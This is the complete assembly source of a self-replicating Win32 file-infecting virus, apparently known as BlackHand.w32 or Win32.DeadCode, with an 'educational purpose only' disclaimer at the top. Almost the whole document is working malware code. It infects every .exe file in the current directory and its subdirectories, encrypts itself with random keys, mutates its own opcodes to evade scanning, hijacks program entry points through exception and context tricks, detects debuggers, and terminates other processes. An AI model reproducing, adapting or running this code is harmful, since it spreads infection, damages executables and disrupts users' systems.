; BlackHand.w32 source code
;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
; This code is provided AS IS, and it is only for EDUCATIONAL PURPOSE!!!
; I CAN NOT BE RESPONSIBLE FOR ANY DAMAGE THAT LAMERS, SCRIPT KIDDIED AND OTHER DUMB FUCKERS
; DO WITH THIS CODE. 
; THIS CODE HAS BEEN SENT TO ALL AV COMPANIES. IT IS KNOWN AS Win32.DeadCode.a/b VIRUS
; IF YOU DOWNLOADED THIS CODE LIMIT IT TO PERSONAL USE AND RESEARCH, DO NOT DESTROY ANYTHING
; AND AGAIN DO NOT DESTROY ANYTHING!!!!!!!!!!!!!!!!
;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
; Anti-debugging : yes, PEB.BeingDebugged (trying to implement working int 3 exectpion)
; Anti-Emulation : yes (SEH redirection/CreateThread execution)
; Anti-Heuristic : not using jmp/call/pop to get delta
; Crypted        : Virus is xored neg xored ror/rol 16
;                  1st xor key is always randomly generated for any new infected file
;                  using T-2000 random generator from 29a #4
;                  2nd xor key is, also, always randomly generated using my lame random number
;                  generator 
; Polymorphism   : Yes, well I'll rather call it "opcode switch" b/c that's what I do with my
;                  poly engine, a few 2byte long opcodes are modified :
;                  mov to push/pop, ror/rol, xor reg/reg (d bit) and push/pop to mov 
;                  small, lame, but it is working...
; EPO            : yes (seh/acces violation/context redirection) 3 different EPOs
; Infection      : infects all files in current direcotry/sub directories, appending to last section
; Evil           : terminates all processes that have same base addr as infected progy
;                  (after you quit infected progy)
; payload        : Long Live Great SERBIA (and you can change it in what ever you want)
;                  (After you quit infected progy)
; meta-swap      : implemented and working with a few instructions
; Multi-thrad    : yes, execution of infected process and virus at the same time
;                  using CreateProcessW/_RTL_USER_PROCESS_PARAMETERS/WriteProcessMemory
;
; Delta          : Our host redirection will provide us with delta!!!!! no need to use call/jmp/pop
;                : We will use context to store data into eax,ebx, ecx and eip
;   
;                                                       deroko <deroko<at>gmail<dot>com>
;        
;                
.586 
.model flat, stdcall
locals
jumps

INFINITE equ 0FFFFFFFFh
null equ 0
true equ 1
section_size		equ 	2000h ;for now
include mz.inc
include pe.inc
include win32api.inc
include my_inc.inc
include useful.inc
include s2c.inc
include meta.inc

extrn MessageBoxA:proc
extrn ExitProcess:proc

.data
loader db "Loader for Blackhand w32",0
mtitle db "Loader",0

.code
first_gene:
                     call MessageBoxA, null, offset loader, offset mtitle, null
                     mov eax, offset start
                     mov ebx, 0
                     call start
                     call ExitProcess, null				   	

start:    
;--------------------
; eax start of virus
; ebx encryption key1
; edx encryption key2
;--------------------
                     test ebx, ebx
                     jz __crypted

;-----------------------------
;Decryption rutine starts here
;ebx has crypt key
;----------------------------
__poly_pushad:
                     @pushad
                     mov ecx, crypted_size
__polly0: ;2 instructions... (__polly0 - start)
                     mov esi, eax
                     mov edi, esi
                     add esi, __crypted-start
                     add edi, __crypted-start
__decrypt_viri:
__poly_lodsd:
                     @lodsd

__polly1: ;4 instructions... in decryptor (__polly1 - start)
                     xor eax, edx
                     neg eax
                     xor eax, ebx
                     ror eax, 16
__poly_stosd:
                     @stosd
                     loop __decrypt_viri
__poly_popad:
                     @popad	          	      
__crypted:
                     mov edx, eax
                     call n00k_debuggie
                     mov ebp, edx
                     add ebp, address-start
                     mov [ebp.viristart], eax
                     mov [ebp.gene], ebx
                     call KernelBase
                     mov [ebp.kernel32base], eax
                     lea esi, [ebp.pVirtualProtect]
                     add edx, apizz-start
                     call LoadAPIs, esi, edx, [ebp.kernel32base], 25

;-----------------------------------
;Get base_address of this module
;-----------------------------------
                     mov eax, dword ptr FS:[30h]
                     mov eax, dword ptr[eax+8]
                     mov [ebp.currbase], eax
					
                     mov [ebp.random_seed], 12345678h
;----------------------------------------------------------------
;When we are done with infecting files
;Just return to original host
;Ok this code might look confusing but it isn't at all
;THIS IS TEST VIRUS AND TEST RETURN TO HOST 
;It will createprocessW for new process  
;----------------------------------------------------------------
					
ReturnToHost:
                     @SEH_SetupFrame <jmp __Exit_nice_and_clean>
                     cmp [ebp.gene], 0
                     jnz __Xth_gene
                     call [ebp.pVirtualAlloc], null, size WIN32_FIND_DATA, MEM_COMMIT, PAGE_READWRITE
                     push eax
                     pop [ebp.wfdptr]
                     call find_files
                     call [ebp.pVirtualFree], [ebp.wfdptr], size WIN32_FIND_DATA, MEM_DECOMMIT	
                     jmp __Exit_nice_and_clean
					
__Xth_gene:
                     ;----------------------------------------------
                     ;Create_infection_thread
                     ;----------------------------------------------
                     mov eax, [ebp.viristart]
                     add eax, infection_thread - start
                     lea esi, [ebp.dummy]
		
                     call [ebp.pCreateThread], null, stacksize, eax, ebp, null, esi
                     mov [ebp.wfmo1], eax
		
                     ;-----------------------------------------------
                     ;Start new infected process
                     ;-----------------------------------------------
                     call [ebp.pVirtualAlloc], null, size PROCESS_STRUCT, MEM_COMMIT, PAGE_READWRITE
                     mov [ebp.pinfo], eax
                     ;---------------------------------------------------------------
                     ;Get path to infected progy eg (C:\Program Files\IE\IEXPLOR.EXE)
                     ;---------------------------------------------------------------
                     mov eax, dword ptr FS:[30h]
                     mov eax, dword ptr[eax+10h]
                     mov eax, dword ptr[eax+3ch] ;<---- eax has path!!
                     mov esi, [ebp.pinfo]       ;<---- Process INFO STRUCT
                     lea edi, [esi.si_cb]
                     ;---------------------------------------------------------
                     ;Run infected progy but suspended now so
                     ;I can write old data to its entry pooint and to resume it
                     ;---------------------------------------------------------
                     call [ebp.pCreateProcessW], null, eax, null, null, true, CREATE_SUSPENDED, \
																			null, null, edi, esi
                     test eax, eax
                     jz __Exit_nice_and_clean
                     push [esi.pi_hThread]
                     pop  [ebp.wfmo2]
					
                     mov eax, dword ptr FS:[30h]
                     mov eax, dword ptr[eax+8]
                     mov ebx, eax
                     add ebx, dword ptr[ebx.MZ_lfanew]
                     mov ebx, [ebx.NT_OptionalHeader.OH_AddressOfEntryPoint]
                     add ebx, eax
                     mov ecx, [ebp.viristart]
                     add ecx, old_host- start
                     lea eax, [ebp.dummy]
                     call [ebp.pWriteProcessMemory], [esi.pi_hProcess], ebx, ecx, host_size, eax
                     call [ebp.pResumeThread], [esi.pi_hThread]
                     lea  esi, [ebp.wfmo1]
                     call [ebp.pWaitForMultipleObjects], 2, esi, true, INFINITE 
                     call [ebp.pVirtualFree], [ebp.pinfo], size PROCESS_STRUCT, MEM_DECOMMIT	  
__Exit_nice_and_clean:
                     @SEH_RemoveFrame
                     call harmless_payload
                     call enum_processes
                     call [ebp.pExitProcess], null
	          

KernelBase:
;------------------------------------
;Scan SEH --- last ptr is FFFFFFFFh
;Find last chain which is in kernel32
;------------------------------------
                     mov esi, FS:[0]
__seh:
                     @lodsd
                     cmp eax, 0FFFFFFFFh
                     je  __find_kernel
                     mov esi, eax
                     jmp __seh  
__find_kernel:  
                     mov edi, [esi+4]        ;seh handle 
                     and edi, 0FFFF0000h     ;Wipe low word
__spin:
                     cmp word ptr[edi], 'ZM'      
                     jz __test_pe
                     sub edi, 10000h
                     jmp __spin 
__test_pe:
                     mov ebx, edi
                     add ebx, [ebx.MZ_lfanew]
                     cmp word ptr[ebx],'EP'
                     je __ret_kernel_base
                     jmp __spin   
__ret_kernel_base:
                     mov eax, edi
                     ret		

;------------------------------
;1st arg = handle
;2nd arg = api_name		
;------------------------------			
GetProc:
handle equ dword ptr[ebp+8]
api    equ dword ptr[ebp+12]
                     push ebp
                     mov ebp, esp
                     mov esi, api
__api_len:
                     lodsb
                     test al, al
                     jnz __api_len
                     sub esi, api
                     mov ecx, esi
    
                     mov ebx, handle
                     add ebx, [ebx.MZ_lfanew]
                     mov ebx, [ebx.NT_OptionalHeader.OH_DirectoryEntries.DE_Export.DD_VirtualAddress]
                     add ebx, handle
                     mov edx, [ebx.ED_AddressOfNames]
                     add edx, handle
                     sub eax, eax
__find_api:
                     mov esi, [edx]
                     add esi, handle
                     mov edi, offset api
                     push ecx       
                     cld
                     repe cmpsb
                     pop  ecx
                     jz __find_ordinal
                     add edx, 4
                     inc eax
                     jmp __find_api

__find_ordinal:
                     mov esi, [ebx.ED_AddressOfNameOrdinals]
                     add esi, handle
                     sub edx, edx
                     mov dx, word ptr[esi+eax*2]
       
                     mov esi, [ebx.ED_AddressOfFunctions]
                     add esi, handle
                     mov eax, [esi+edx*4]
                     add eax, handle
    
                     mov esp, ebp
                     pop ebp
                     ret 8								 


;-------------------------------------------------
;LoadAPIs proc
; 1st_arg = destination (where to store addresses)
; 2nd_arg = pointer to api names list
; 3rd_arg = dll_handle
; 4th_arg = How many apis to load
;-------------------------------------------------      
LoadAPIs:
api_dest equ dword ptr[ebp+8]
api_src  equ dword ptr[ebp+12]
dll_addr equ dword ptr[ebp+16]
api_num  equ dword ptr[ebp+20]
                     push ebp
                     mov ebp, esp
                     mov edi, api_dest
                     mov esi, api_src
                     mov ecx, api_num
__load_apis:
                     push ecx
                     push esi
                     push edi
                     call GetProc, dll_addr, esi
                     pop edi
                     pop esi
                     pop ecx
                     @stosd
__next_api:
                     lodsb
                     test al, al
                     jnz __next_api
                     loop __load_apis
                     mov esp, ebp
                     pop ebp
                     ret 16
					
;----------------------------------------------
;Infection thread, will run paralel with
;infected process...
;1st arg = pointer to api address list
;----------------------------------------------
infection_thread:
                     mov ebp, dword ptr[esp+4]
                     call [ebp.pVirtualAlloc], null, size WIN32_FIND_DATA, MEM_COMMIT, PAGE_READWRITE
                     test eax, eax
                     jz __exit_infection_thread
                     mov [ebp.wfdptr], eax
                     call find_files
                     ;call enum_processes
                     call [ebp.pVirtualFree], [ebp.wfdptr], size WIN32_FIND_DATA, MEM_DECOMMIT
__exit_infection_thread:
                     call [ebp.pExitThread], null
                     ret	

;-------------------------------------------------------------
;This will enum all running processes
;but will infect files in only
; 
; Terminate some processes that have same base addr
; as infected progy, reason is simple, don't wanna
; kill whole windows...
; Also I will implemnt file infecting for those
; processes by getting their cur dir from RTL_USER_PROCESS_INFO
;--------------------------------------------------------------
enum_processes:
                     ;First load psapi.dll
                     x_push ebx, <psapi.dll~>
                     mov    ebx, esp
                     call [ebp.pLoadLibraryA], ebx
                     x_pop
                     test eax, eax
                     jz __ret_enum_processes
                     mov [ebp.psapibase], eax
                     x_push ebx, <EnumProcesses~>
                     mov    ebx, esp
                     call GetProc, eax, ebx
                     x_pop
                     mov [ebp.pEnumProcesses], eax
                     call [ebp.pVirtualAlloc], null, 1024, MEM_COMMIT, PAGE_READWRITE
                     test eax, eax
                     jz __ret_enum_processes
                     mov [ebp.procBuff], eax
                     lea esi, [ebp.dummy]
                     call [ebp.pEnumProcesses], eax, 1024, esi
                     test eax, eax
                     jz __ret_enum_processes
                     xor edx, edx
                     mov ecx, 4
                     mov eax, [ebp.dummy]
                     div ecx
                     mov ecx, eax     
                     mov ebx, dword ptr FS:[20h]       ;<------our processID (don't wana terminate this process)
__loop_processes:
                     mov eax, [ebp.procBuff]
                     mov eax, dword ptr[eax+ecx*4]       ;<------processID in eax
                     push ebx
                     push ecx
                     cmp eax, ebx
                     je __next_process
                     call [ebp.pOpenProcess], PROCESS_TERMINATE or PROCESS_VM_READ, null,  eax
                     test eax, eax
                     jz __next_process
                     mov edx, dword ptr FS:[30h]
                     add edx, 8
                     lea esi, [ebp.dummy]
                     lea edi, [ebp.temp]
                     push eax
                     call [ebp.pReadProcessMemory], eax, edx, esi, 4, edi
                     pop eax
                     mov ebx, [ebp.currbase]
                     cmp ebx, [ebp.dummy]
                     jne __next_process		  
                     call [ebp.pTerminateProcess], eax, null   ;Exit code for killed process
__next_process:
                     pop ecx	
                     pop ebx				
                     loop __loop_processes	
                     call [ebp.pVirtualFree], [ebp.procBuff], 1024, MEM_DECOMMIT				
__ret_enum_processes:
                     ret
					

;----------------------------------------------
;Payload to be executed at the end of virus
;----------------------------------------------
harmless_payload:				
                     x_push edx, <user32.dll~>
                     mov    edx, esp
                     call [ebp.pLoadLibraryA], edx
                     x_pop
                     mov [ebp.user32base], eax
                     x_push ecx, <MessageBoxA~>
                     mov    ecx, esp
                     call GetProc, eax, ecx
                     x_pop
                     mov [ebp.pMessageBoxA], eax
                     x_push  ebx, <Long Live Great SERBIA~>
                     mov     ebx, esp
                     call [ebp.pMessageBoxA], null, ebx, ebx, MB_OK
                     x_pop
                     ret
					
;----------------------------------------------
;Search for .EXE files in	current direcotry and
;subdirectories for valid PE files...
;----------------------------------------------				
find_files:
                     pushad
                     push '*.*'
                     mov eax, esp
                     call [ebp.pFindFirstFileA], eax, [ebp.wfdptr]
                     pop ecx                              ;<--------clear stack!!!
                     or eax, eax
                     js __exit
                     mov esi, eax
                     mov edi, [ebp.wfdptr]
                     test [edi.WFD_dwFileAttributes], FILE_ATTRIBUTE_DIRECTORY
                     jnz __dir

__loop_files:
                     push esi
                     call [ebp.pFindNextFileA], esi, edi
                     pop esi
                     test eax, eax
                     jz __exit
                     test [edi.WFD_dwFileAttributes], FILE_ATTRIBUTE_DIRECTORY
                     jnz __dir
                     push [edi.WFD_nFileSizeLow]
                     pop  [ebp.fsize]
                     lea ebx, [edi.WFD_szFileName]
                     mov [ebp.fname], ebx
                     ;-------------------------------------------------
                     ;Check if it is .exe file, if it is call infect_PE
                     ;else find next file
                     ;-------------------------------------------------
                     push edi
                     mov edi, ebx
                     sub eax, eax
                     mov ecx, 260
                     cld
                     repnz scasb
                     mov eax, [edi-5]
                     pop edi
                     or  eax, 20202000h
                     cmp eax, 'exe.'
                     jne __continue_searching
                     cmp dword ptr[ebx], 'sotn'                   ;don't touch ntoskrnl.exe if we find it out of
                     je __continue_searching                      ;Windows directory
                     call infect_PE
__continue_searching:
                     jmp __loop_files
    
__dir:
                     lea ebx, [edi.WFD_szFileName]
                     cmp byte ptr[ebx], '.'
                     je __loop_files
                     cmp dword ptr[ebx], 'WIND'                    ;Don't infect WINDOWS folder
                     je __loop_files
                     call [ebp.pSetCurrentDirectoryA], ebx
                     call find_files
                     jmp __loop_files
__exit:
                     call [ebp.pFindClose], esi
                     push '..'
                     call [ebp.pSetCurrentDirectoryA], esp
                     pop ecx
                     popad
                     ret


;------------------------------------------------------
;This is used to map files to memory, sets [ebp.memptr]
;to maped file... 
;1st arg = file_name
;2nd arg = fsize (set 0 if you want to map file as is)
;error sets [ebp.memptr] to 0xdeadc0deh (signature)
;------------------------------------------------------
map_file:
file_name equ dword ptr[esp+4]
fsizee    equ dword ptr[esp+8]
                     mov [ebp.memptr], signature
                     mov esi, file_name
                     mov edi, fsizee     
                     call [ebp.pCreateFileA], esi, GENERIC_READ + GENERIC_WRITE, null, null, OPEN_EXISTING, null,null
                     or eax, eax
                     js __exit_map_file
                     mov [ebp.fd], eax
                     call [ebp.pCreateFileMappingA], eax, null, PAGE_READWRITE, null, edi, null
                     test eax, eax
                     jz __cant_create_map
                     mov [ebp.temp], eax
                     call [ebp.pMapViewOfFile], eax, FILE_MAP_ALL_ACCESS, null, null, edi
                     test eax, eax
                     jz __cant_map
                     mov [ebp.memptr], eax
                     jmp __exit_map_file

__cant_map:
                     call [ebp.pCloseHandle], [ebp.temp]          
__cant_create_map:
                     call [ebp.pCloseHandle], [ebp.fd]          
__exit_map_file:
                     ret 8

;------------------------------------
;close_map_file
;closes all handles of maped file
; args =0
;------------------------------------
close_map_file:
                     call [ebp.pUnmapViewOfFile], [ebp.memptr]
                     call [ebp.pCloseHandle],[ebp.temp]
                     call [ebp.pCloseHandle],[ebp.fd]
                     ret

;-----------------------------------------
;Check for valid PE files, don't wanna
;infect something that look like PE
;but ain't PE, what a nice description
;Args = 0
;uses [ebp.memptr] 
;return values eax = signature (0xdeac0de)
;-----------------------------------------
is_valid_pe:
                     push ebp
                     @SEH_SetupFrame <jmp __ret_is_valid_pe>
                     mov [ebp.dummy], signature
                     mov ebx, [ebp.memptr]
                     cmp word ptr[ebx], 'ZM'
                     jne __ret_is_valid_pe
                     add ebx, [ebx.MZ_lfanew]
                     cmp word ptr[ebx], 'EP'
                     jnz __ret_is_valid_pe
                     mov [ebp.dummy], valid
__ret_is_valid_pe:				
                     @SEH_RemoveFrame
                     pop ebp
                     ret
;----------------------------------------------------
;Checks if file has been infected
; args = 0
; return values :
; 		eax = signature (infected)
;     eax = valid     (not infected yet)
;----------------------------------------------------
is_infected:
                     mov eax, signature
                     mov ebx, [ebp.memptr]
                     add ebx, 40h
                     cmp dword ptr[ebx], signature
                     je __ret_is_infected
                     mov eax, valid
__ret_is_infected:
                     ret

;-----------------------------------------------------
;Finaly we got to the our RNA(Ribo nuclein acid) which
;is main part of any bilogical virus 
;Args = 0
;[ebp.fname] has name
;[ebp.fszie] has file size
;------------------------------------------------------
infect_PE:
                     pushad
                     call map_file, [ebp.fname], null
                     cmp [ebp.memptr], signature
                     je __ret_infect_pe
                     call is_valid_pe
                     cmp [ebp.dummy], signature
                     je __unmap_file
                     call is_infected
                     cmp eax, signature
                     je __unmap_file
                     ;------------------------------------------
                     ;If file is valid PE and not infected
                     ;infect it
                     ;1st close it!!!!!
                     ;and open with new size (old+1000h)
                     ;------------------------------------------
                     call close_map_file
                     mov eax, [ebp.fsize]
                     add eax, section_size
                     call map_file, [ebp.fname], eax
                     cmp [ebp.memptr], signature
                     je __ret_infect_pe
                     mov edi, [ebp.memptr]
                     mov ebx, edi
                     add edi, 40h
                     mov dword ptr[edi], signature
                     ;------------------------------------------
                     ;Find where is located entry point
                     ;------------------------------------------
                     add ebx, dword ptr[ebx.MZ_lfanew]
                     mov [ebp.nthdr], ebx
                     mov esi, [ebx.NT_OptionalHeader.OH_AddressOfEntryPoint]
                     movzx ecx, [ebx.NT_FileHeader.FH_NumberOfSections]
                     add ebx, size IMAGE_NT_HEADERS
__find_entry:
                     cmp     esi ,[ebx].SH_VirtualAddress
                     jb      __next_section
                     mov     edi, [ebx].SH_VirtualAddress
                     add     edi, [ebx].SH_SizeOfRawData
                     cmp     edi, esi
                     ja      __copy_host 
__next_section:
                     add     ebx, size IMAGE_SECTION_HEADER
                     loop    __find_entry
__copy_host:
                     ;---------------------------------------------------------
                     ;First of all I want code section to be writable evetytime
                     ;copy data from entry point to allocated buffer
                     ;copy host to entry point 
                     ;---------------------------------------------------------
                     pushad
                     call [ebp.pVirtualAlloc], null, 50h, MEM_COMMIT, PAGE_READWRITE
                     mov [ebp.oldhost], eax
                     popad
					
                     or [ebx.SH_Characteristics], IMAGE_SCN_MEM_WRITE
                     sub esi, [ebx.SH_VirtualAddress]
                     add esi, [ebx.SH_PointerToRawData]
                     add esi, [ebp.memptr]
                     push esi
                     mov edi, [ebp.oldhost]
                     mov ecx, host_size
                     cld
                     rep movsb
					
                     ;----------------------------------------------------------
                     ;Copy virus redirection to entry point now
                     ;----------------------------------------------------------
                     call SelectHost
                     pop edi
                     mov esi, [ebp.selected_host]
                     mov ecx, [ebp.selected_host_size]
                     cld
                     rep movsb
                     ;----------------------------------------------------------
                     ;Generate 2 "random" keys for crypting (for later use)
                     ;----------------------------------------------------------
                     call Generate_key
                     mov [ebp.cryptkey], eax
                     call Generate_key2
                     mov [ebp.cryptkey2], eax
                     ;----------------------------------------------------------
                     ;Find last section and append virus to it
                     ;----------------------------------------------------------
                     mov ebx, [ebp.nthdr]
                     movzx ecx, [ebx.NT_FileHeader.FH_NumberOfSections]
                     mov eax, ebx
                     add eax, size IMAGE_NT_HEADERS
__last_section:
                     add eax, size IMAGE_SECTION_HEADER
                     loop __last_section
                     sub eax, size IMAGE_SECTION_HEADER
                     or [eax.SH_Characteristics], IMAGE_SCN_MEM_WRITE or IMAGE_SCN_MEM_READ or \
                                                        IMAGE_SCN_CNT_INITIALIZED_DATA
			
                     ;-------------------------------------------------------
                     ;Copy virus to last section and set RVA to virus
                     ;I have seen taht last section has RawSize = 0 or 
                     ;smaller then VirtualSize... so I have to make different
                     ;approach on injecting virus ->
                     ;if VirtualSize < SizeOfRawData
                     ; VirtualSize += section_size RawDataSize += section_size
                     ; Virus RVA = VirtualAddress + VirtualVirtualSize
                     ;if VirtualSize > SizeOfRawData
                     ; VirtualSize += section_size RawDataSize += section_size
                     ; Virus RVA = VirtualAddress + SizeOfRawData
                     ;--------------------------------------------------------
                     mov edx, [eax.SH_SizeOfRawData]
                     cmp edx, [eax.SH_VirtualSize] 
                     jb __Size_Of_Raw_Data_is_smaller
                     mov edx, [eax.SH_VirtualAddress]
                     add edx, [eax.SH_VirtualSize]
                     mov ecx, [ebp.memptr]
                     add ecx, 44h
                     mov dword ptr[ecx], edx
                     mov edi, [eax.SH_PointerToRawData]
                     add edi, [eax.SH_VirtualSize]
                     add edi, [ebp.memptr]
                     push edi
                     jmp __Copy_Virus_To_Host
__Size_Of_Raw_Data_is_smaller:
                     mov edx, [eax.SH_VirtualAddress]
                     add edx, [eax.SH_SizeOfRawData]
                     mov ecx, [ebp.memptr]
                     add ecx, 44h
                     mov dword ptr[ecx], edx
                     mov edi, [ebp.memptr]
                     add edi, [eax.SH_PointerToRawData]
                     add edi, [eax.SH_SizeOfRawData]
                     push edi
__Copy_Virus_To_Host:
                     add [eax.SH_VirtualSize], section_size
                     add [eax.SH_SizeOfRawData], section_size
                     add [ebx.NT_OptionalHeader.OH_SizeOfImage], section_size
							
                     mov esi, [ebp+viristart]
                     mov ecx, virus_end-start
                     cld 
                     rep movsb

                     ;-----------------------------------------
                     ; crypt virus and store encryption key
                     ;-----------------------------------------
                     mov    esi, [ebp.memptr]
                     add    esi, 48h
                     push   [ebp.cryptkey]
                     pop    dword ptr[esi]
                     push   [ebp.cryptkey2]
                     pop    dword ptr[esi+4]
                     pop    edi
                     push   edi
                     mov    esi, [ebp.oldhost]
                     add    edi, old_host - start
                     mov    ecx, host_size
                     rep    movsb
                     pop    edi
                     push   edi ;<--- eave edi for CrytptVirus
                     call   meta_swap_engine, edi, mutation - start
                     pop    edi
                     add    edi, __crypted - start
                     call   CryptVirus, edi, [ebp.cryptkey], [ebp.cryptkey2]
                     call   [ebp.pVirtualFree], [ebp.oldhost], 50h, MEM_DECOMMIT
                     ;-------------------------------------
                     ; Do poly stuff with decryptor loop
                     ;-------------------------------------
  
                     ;-------------------------------------
                     ;Infection done
                     ;-------------------------------------					                  
__unmap_file:
                     call close_map_file
__ret_infect_pe:
                     popad
                     ret
;-----------------------------------------------------
; With this I will overwrite original host and
; like taht I will try to full AVs, it worked
; with my test version, and works now
; At image_base+40h is signature of virus
; At image_base+44h is RVA to virus
;-----------------------------------------------------
host:     
                     sub  eax, eax
                     test eax, eax
                     jz   __gime_seh 
__my_seh:
                     push dword ptr FS:[0]
                     mov  dword ptr FS:[0], esp
                     mov  dword ptr[eax], eax   ;Access violation
__gime_seh:
                     call   __my_seh
__seh_handler:
                     mov  esi, [esp+0ch]
                     mov  eax, FS:[30h]
                     mov  eax, dword ptr[eax+8] 
                     mov  ebx, dword ptr[eax+48h]   ; First crypte key
                     mov  edx, dword ptr[eax+4ch]   ; Second crypt key
                     add  eax, dword ptr[eax+44h]   ; RVA of a virus
                     mov  [esi.CONTEXT_Eip], eax
                     mov  [esi.CONTEXT_Eax], eax
                     mov  [esi.CONTEXT_Ebx], ebx
                     mov  [esi.CONTEXT_Edx], edx
                     sub  eax, eax
                     ret                      
__end_host:

host1:		
                     mov eax, signature
                     push eax
                     pop edx
                     mov eax, dword ptr FS:[30h]
                     mov eax, dword ptr[eax + 8]
                     mov ebx, dword ptr[eax + 48h]
                     mov edx, dword ptr[eax + 4ch]
                     add eax, dword ptr[eax + 44h]
                     call eax
__end_host1:


host2:    
                     push dword ptr FS:[30h]
                     pop  eax
                     mov eax, dword ptr[eax +8]
                     push dword ptr[eax+48h]
                     pop ebx
                     push dword ptr[eax+4ch]
                     pop edx
                     add eax, dword ptr[eax+44h]
                     jmp eax
__end_host2:
			

;-----------------------------------
; Generate random key for encription
; code T-2000 29a zine
;-----------------------------------
Generate_key:
                     call [ebp.pGetTickCount]
                     push eax
                     call [ebp.pGetTickCount]
                     pop ecx
                     add eax, ecx
                     rol ecx,1
                     add ecx, 333h
                     push ecx
                     mov ecx, 32
__CRC_bit:  
                     shr eax,1
                     jnc __Loop_CRC_bit
                     xor eax, 0EDB88320h
__Loop_CRC_bit:
                     loop __CRC_bit
                     pop ecx
                     ret

;----------------------------------------------
; Generate second random key my dummy generator
;----------------------------------------------

Generate_key2:
                     call [ebp.pGetTickCount]
                     mov ecx, eax
                     shl ecx, 16
                     call [ebp.pGetTickCount]
                     neg eax
                     and eax, 0000FFFFh
                     add eax, ecx
                     ret					
;----------------------------------------------
;Debugged will check if we are being debugged
;----------------------------------------------

n00k_debuggie:
                     @pushad
                     mov eax, dword ptr FS:[30h]
                     movzx ebx, byte ptr[eax+2]
                     test ebx, ebx
                     jz __not_debugged
                     push signature
                     ret
__not_debugged:
                     @popad
                     ret


;------------------------------------------------------
;Output [ebp.selected_host] has address of host to copy
;------------------------------------------------------
SelectHost:
                     @pushad
                     push [ebp.viristart]
                     pop  [ebp.selected_host]
                     mov eax, 3
                     call brandom32
                     cmp eax, 0
                     je __host_selected
                     cmp eax, 1
                     je __host1_selected
                     add [ebp.selected_host], host2 - start
                     mov [ebp.selected_host_size], __end_host2-host2
                     jmp __exitSelect_host
__host_selected:
                     add [ebp.selected_host], host - start
                     mov [ebp.selected_host_size], __end_host - host
                     jmp __exitSelect_host
__host1_selected:
                     add [ebp.selected_host], host1 - start
                     mov [ebp.selected_host_size], __end_host1 - host1
__exitSelect_host:
                     @popad
                     ret

;--------------------------------------------
;Random in range number generator
;--------------------------------------------
brandom32:                                     
                     push edx                                   
                     push ecx                                    
                     mov edx, 0                                  
                     push eax                                    
                     call random32                               
                     pop ecx                                     
                     div ecx                                     
                     xchg eax, edx                               
                     pop ecx                                     
                     pop edx                                     
                     ret                                         
                                                   
                                                   
random32:                                       
                     push edx                                
                     call [ebp.pGetTickCount] 
                     rcl eax, 2               
                     add eax, [ebp.random_seed]                        
                     adc eax, esp                                
                     xor eax, ecx 
                     xor [ebp.random_seed], eax                  
                     add eax, [esp-8]                            
                     rcl eax, 1                                  
                     pop edx                                     
                     ret                                         

										
CryptVirus:
whereto     equ  dword ptr[ebp+8]
key1        equ  dword ptr[ebp+12]
key2        equ  dword ptr[ebp+16]
                     push ebp
                     mov  ebp, esp
                     @pushad
                     mov ecx, crypted_size
                     mov esi, whereto
                     mov edi, esi
__decrypt:
                     @lodsd
                     ror eax, 16
                     xor eax, key1
                     neg eax
                     xor eax, key2
                     @stosd
                     loop __decrypt
                     @popad
                     mov esp, ebp
                     pop ebp
                     ret 12				
                              
; only reason why I've wrote prolog/epilog is to meta-swap them
; also it should have some garbage instructions eg. xor reg/reg mov reg1/reg1
; after unconditional jump to meta them and break scan string as much as possible
; also there is a planty of @stosd and one @lodsd macro which will mutate

include              meta.asm
;-------------------------------------------
;blackhand.w32 will store here old host data
;-------------------------------------------
old_host:
                     db host_size dup(90h)
;--------------------------------------------------
;Needed APIz
;--------------------------------------------------

apizz:
db "VirtualProtect",0
db "VirtualAlloc",0
db "FindFirstFileA",0
db "FindNextFileA",0
db "CreateFileA",0
db "CreateFileMappingA",0   
db "MapViewOfFile",0
db "CloseHandle",0
db "UnmapViewOfFile",0
db "VirtualFree",0
db "LoadLibraryA",0
db "CreateThread",0
db "WaitForMultipleObjects",0
db "WaitForSingleObject",0
db "ExitProcess",0
db "ExitThread",0
db "FindClose",0
db "SetCurrentDirectoryA",0
db "WriteProcessMemory",0
db "CreateProcessW",0
db "ResumeThread",0
db "GetTickCount",0
db "TerminateProcess",0
db "OpenProcess",0
db "ReadProcessMemory",0
__end_crypted:
virus_end:
address   dd 200 dup(0)
end first_gene